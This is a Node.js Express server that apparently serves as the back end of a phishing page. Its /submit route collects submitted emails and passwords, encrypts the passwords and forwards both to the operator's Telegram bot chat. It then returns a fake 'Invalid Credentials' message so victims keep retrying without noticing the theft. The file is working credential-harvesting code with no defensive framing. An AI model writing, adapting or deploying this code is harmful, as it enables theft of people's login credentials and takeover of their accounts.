import express from "express";
import axios from "axios";
import dotenv from "dotenv";
import cors from "cors";
import CryptoJS from "crypto-js";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(
  cors({
    origin: "*", // ["https://bellspwd.onrender.com", "http://127.0.0.1:5500"],
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECRET_KEY = process.env.SECRET_KEY; // Secret key is only in backend

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

// 🔐 Encrypt the password before sending to Telegram
function encryptPassword(password) {
  return CryptoJS.AES.encrypt(password, SECRET_KEY).toString();
}

app.post("/submit", async (req, res) => {
  try {
    console.log("Received data:", req.body); // 🔥 Logs incoming data for debugging

    const { email, password } = req.body;
    if (!email || !password) {
      return res
        .status(400)
        .json({ status: "error", message: "Missing fields" });
    }

    const encryptedPassword = encryptPassword(password); // 🔥 Encrypt password in backend

    await sendToTelegram(
      `📧 Email: ${email}\n🔐 Encrypted Password: ${encryptedPassword}`
    );

    res.json({
      status: "success",
      message: "Invalid Credentials, please try again!",
    });
  } catch (error) {
    console.error("Error processing request:", error);
    res.status(500).json({ status: "error", message: "Server error" });
  }
});

app.listen(PORT, () =>
  console.log(`Server running on http://localhost:${PORT}`)
);
